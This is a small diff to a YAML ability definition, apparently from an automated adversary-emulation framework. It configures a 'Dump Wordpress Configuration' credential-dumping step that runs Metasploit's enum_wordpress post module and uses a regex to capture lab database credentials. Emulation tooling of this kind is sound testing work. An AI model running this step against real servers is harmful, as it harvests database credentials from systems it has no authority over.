@@ -6,10 +6,11 @@
     Dump Wordpress Configuration
   tactic: os-credential-dumping
   technique: msf-wp-dump-conf
-  parser: msf.yml
+  parser:
+    flag: (?:Storing Wordpress database credentials:) (mysql:\/\/root:root@wordpress-mysql:3306\/wordpress)
   payload: msf.py
   commands:
     - "use post/linux/gather/enum_wordpress"
   options:
-    # - "set SESSION 1"
+    - "set SESSION #{SESSION}"
     - "run"
